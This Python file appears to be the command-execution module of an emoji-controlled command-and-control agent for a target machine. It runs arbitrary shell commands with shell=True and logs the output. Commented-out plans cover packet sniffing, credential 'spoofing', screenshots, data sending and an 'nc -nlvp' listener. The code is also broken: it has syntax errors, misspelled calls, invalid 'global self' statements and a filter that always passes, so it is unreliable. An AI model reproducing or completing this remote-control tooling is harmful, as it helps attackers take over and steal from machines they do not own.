#!/bin/python3

# This file shall contain functions related to executions of commands
# 1. Execute commands and return their STDOUT and STDERR
# 2. Return should be in the form of a list/dictionary
# 3. Feel free to use os/subprocess as required

import emoji
import os
import sys
from subprocess import run

from pathlib import Path

from miscellaneous import *


# Emoji to use as cmd
'''
sniff = "\U0001F440"         # To sniff/capture packets on trgt machine  : eyes
drop = "\U0001F4A3"          # Dropping file/folder on trgt              : bomb
'''


door = "\U0001F6AA"          # Exiting                                   : door
file = "\U0001F4DD"          # file                          		 : memo
chng_direc = "\U0001F3CE"    # chnging directory                         : racing car
remove  = "\U0001F6AE"       # removing                                  : litter in bin sign
folder = "\U0001F4C1"        # folder                                    : file folder
see = "\U0001F50D"	     # see					 : magnifying glass tilted left
make = "\U0001F6E0"	     # making					 : hammer and wrench
#open_port = "\U00002B55"     # Open port to listen for connection        : hollow red circle
#port_no = "\U0001F522"	     # port number specify			 : input numbers


'''
ss = "\U0001F933"            # Take screenshot                           : selfie
greddy = "\U0001F911"        # To spoof creds from trgt                  : money-mouth face
send = "\U0001F4E4"          # sending data                              : outbox tray
recv = "\U0001F4E5"          # receiving data                            : inbox tray
'''

class Commands:
	def __init__(self, cmd):

		self.cmd = cmd
		self.f = open('output.txt','a', encoding='utf-8'):


	def help(self):
		# help section
		if self.cmd == "help":
			logger = logthis()
			logger.info(f"{cmd}: Appending the help section result in the output.txt file")
			self.f.write("---------------\nINPUT: ")
			self.f.write("help\n")
			self.f.write("OUTPUT:\n")
			self.f.write(
f'''
{door}     --->                   Exiting\n
{make} {file} filename 	--->        Creating file\n
{chng_direc}  directory name --->        Changing directory\n
{remove} {folder} folder name --->    Removing folder\n
{remove} {file} file name --->      Removing file\n
{see} {folder} folder name  --->      listing files present within folder\n
{see} {file}  file name   --->      cating out a file content\n
{open_port} {port_no} port number ---> opening port for incoming connections\n

[*] Other linux commands can also be run
''')

	def exit(self):
		# exiting
		if self.cmd == door:
			logger = logthis()
			logger.info(f"{door}: Connection terminated!!")
			self.f.close() # closing open file
			sys.exit() # exiting C2

	def out_status(self, p):
		# Input
		self.f.write("---------------\nINPUT: ")
		self.f.write(self.p.args)
		# Output
		self.f.write("\n")
		self.f.write("OUTPUT:\n")
		self.f.write(self.p1.stdout)

	def err_status(self, p):
		# Input
		self.f.write("---------------\nINPUT: ")
		self.f.write(self.p.args)
		# Error
		self.f.write("\n")
		self.f.write("ERROR:\n")
		self.f.write(self.p1.stderr)
		# Status
		self.f.write("\n")
		self.f.write("STATUS: ")
		self.f.write(str(self.p1.returncode))

	def touch(self):
		# creating file
		if self.cmd[:10] == make and self.cmd.find(file) and len(self.cmd) > 1:
			self.l = []
			logger = logthis()
			if((self.cmd[22:].find('~') == True) or (self.cmd[22:].find('home') == True)):
				global self.abs_path
				self.abs_path = Path(self.cmd[22:])

			else:
				global self.abs_path
				self.pwd = os.getcwd()
				self.abs_path = self.pwd+ '/' +self.cmd[22:]
				self.abs_path = Path(self.abs_path)

			self.p = run(['touch', self.abs_path], capture_output=True, text=True)
			cl = Commands(self.cmd)

			try:
				# Checking for error status code
				if self.p.returncode != 0:
					logger.error(f"{make} and {self.cmd[22:]}: {self.cmd[22:]} file is already present in {self.pwd}, please rename the filename")
					cl.err_status(self.p)
				else:
					logger.info(f"{make} and {self.cmd[22:]}: {self.cmd[22:]} file is created in {self.pwd}")
					cl.out_status(self.p)

			except Exception as e :
				logger.error(f"{make} and {self.cmd[22:]}: Error Occured While Creating {self.cmd[22:]} file int {self.pwd}")
				logger.error(f"Error: {e}")

			return self.l

	def cd(self):
		# changing directory
		if self.cmd[:10] == chng_direc and len(self.cmd) > 1:
			self.l = []
			logger = logthis()
			if((self.cmd[22:].find('~') == True) or (self.cmd[22:].find('home') == True)):
				global self.abs_path
				self.abs_path = self.cmd[22:]
			else:
				global self.abs_path
				self.pwd = os.getcmwd()
				self.abs_path = self.pwd+ '/' +self.cmd[22:]

			self.p = run(['cd', self.abs_path], capture_output=True, text=True)
			cl = Command(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{chng_direc}: {self.abs_path} directory is present")
					cl.out_status(self.p)
					logger.info(f"Changed directory path to {self.abs_path}")

				else:
					logger.error(f"{chng_direc}: No such directory named {self.abs_path} is present")
					cl.err_status(self.p)

			except Exception as e:
				logger.error(f"Unable to Change Path to : {self.abs_path}")
				logger.error(f"Error : {e}")

			return self.l

	def rm_folder(self):
		# Removing folder
		if self.cmd[:10] == remove and self.cmd.find(folder) and len(self.cmd) > 1:
			self.l = []
			logger = logthis()
			if((self.cmd[22:].find('~') == True) or (self.cmd[22:].find('home') == True)):
				global self.abs_path
				self.abs_path = self.cmd[22:]
			else:
				global self.abs_path
				self.pwd = os.getcwd()
				self.abs_path = self.pwd+'/'+self.cmd[22:]

			self.p = run(self.cmd, capture_output=True, text=True, shell=True)
			cl = Commands(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{remove} and {self.cmd[22:]}: {self.abs_path} Directory is Present")
					cl.out_status(self.p)
					logger.info(f"Removed {self.abs_path} Directory Path")

				else:
					logger.error(f"{remove} and {self.cmd[22:]}: {self.abs_path} Directory is NOT Present")
					cl.err_status(self.p)

		except Exception as e:
			logger.error(f"{remove} and {self.cmd[22:]}: Error Occured While Deleting {self.abs_path}")
			logger.error(f"Error : {e}")

		return self.l

	def rm_file(self):
		# Removing file
		if self.cmd[:10] == remove and self.cmd.find(file) and len(self.cmd) > 1:
			# Calling func from miscellaneous.py
			rm(self.cmd[22:])

	def listing_files(self):
		# Listing files in folder
		if self.cmd[:10] == see and self.cmd.find(folder) and len(self.cmd) > 1:
			self.l = []
			logger = logthis()
			if(self.cmd[22:].find('~') == True) or (self.cmd[22:].find('home') == True):
				global self.abs_path
				self.abs_path = self.cmd[22:]
			else:
				global self.abs_path
				self.pwd = os.getcwd()
				self.abs_path = self.pwd+'/'+self.cmd[22:]

			self.p = run(['ls', '-al', self.abs_path], capture_output=True, text=True)
			cl = Commands(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{see} and {self.cmd[22:]}: {self.abs_path} Directory is Present")
					cl.out_status(self.p)
					logger.info(f"Listed all files present within {self.abs_path}")

				else:
					logger.error(f"{see} and {self.cmd[22:]}: {self.abs_path} Directory is NOT Present")
					cl.err_status(self.p)

			except Exception as e:
				logger.error(f"{see} and {self.cmd[22:]}: Error Occured While Listing files present within {self.abs_path} directory")
				logger.error(f"Error : {e}")

			return self.l

	def cating_file(self):
		# Seeing content of file
		if self.cmd[:10] == see and self.cmd.find(file) and len(self.cmd) > 1:
			self.l = []
			logger = logthis()
			if((self.cmd[22:].find('~') == True) or (self.cmd[22:].find('home') == True)):
				global self.abs_path
				self.abs_path = Path(self.cmd[22:])
			else:
				global self.abs_path
				self.pwd = os.getcwd()
				self.abs_path = self.pwd+'/'+self.cmd[22:]
				self.abs_path = Path(self.abs_path)

			self.p = run(['cat', self.abs_path], capture_output=True, text=True)
			cl = Commands(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{see} and {self.cmd[22:]}: {self.abs_path} is Present")
					cl.out_status(self.p)
					logger.info(f"Showed all the content present within the {self.abs_path} file")

				else:
					logger.error(f"{see} and {self.cmd[22:]}: {self.abs_path} File is NOT Present")
					cl.err_status(self.p)

			except Exception as e :
				logger.error(f"{see} and {self.cmd[22:]}: Error Occured While `cating` out content from {self.abs_path} file")
				logger.error(f"Error: {e}")

			return self.l
'''
	def open_port(self):
		# Opening port to listen for connections
		if self.cmd[:10] == open_port and self.cmd.find(port_no) and len(self.cmd) > 1:
		
			self.l = []
			logger = logthis()
			self.p = run(['nc','-nlvp', self.cmd[22:]], capture_ouput=True, text=True)
			cl = Commands(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{open_port} and {self.cmd[22:]}: port number {self.cmd[22:]} is opened successfully")
					logger.info(f"Port {self.cmd[22:]} is listening for incoming connections...")
					cl.out_status(self.p)
				else:
					logger.error(f"{open_port} and {self.cmd[22:]}: port number {self.cmd[22:]} was NOT opened successfully!!")
					cl.err_status(self.p)

			except Exception as e:
				logger.error(f"{open_port} and {self.cmd[22:]}: Error Occured While opening port number {self.cmd[22:]}")
				logger.error(f"Error: {e}")

			return self.l
'''
	def other_cmd(self):
		# For other linux related commands

		# Filtering out all other commands which have their very own functions mentioned earlier
		if ((self.cmd[:10] != see) or (self.cmd[:10] != remove) or (self.cmd[:10] != chng_direc) or (self.cmd[:10] != make) or (self.cmd[:10] != door) or (self.cmd[:10] != open_port)):

			self.l = []
			logger = logthis()
			self.p = run(self.cmd, capture_output=True, text=True, shell=True)
			cl = Commands(self.cmd)

			try:
				# Checking for output status code
				if self.p.returncode == 0:
					logger.info(f"{self.cmd}: {self.cmd} command executed successfully")
					cl.out_status(self.p)

				else:
					logger.error(f"{self.cmd}: {self.cmd} command NOT executed successfully")
					cl.err_status(self.p)

			except Exception as e :
				logger.error(f"{self.cmd}: Error Occured While executing {self.cmd} command")
				logger.error(f"Error: {e}")

			return self.l

